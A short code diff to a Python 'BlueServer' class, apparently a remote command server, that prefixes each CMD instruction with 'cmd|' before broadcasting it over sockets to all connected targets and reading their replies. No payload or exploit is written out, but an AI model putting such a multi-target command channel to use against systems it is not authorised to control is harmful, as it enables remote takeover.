@@ -54,6 +54,7 @@ class BlueServer:
             elif splits[0].upper() == "CMD":
                 cmd = ' '.join(splits[1:])
                 cmd = cmd.strip()
+                cmd = "cmd|"+cmd
                 for target in self.targets:
                     target.sock.send(cmd.encode())
                     reply = target.sock.recv(1024).decode()
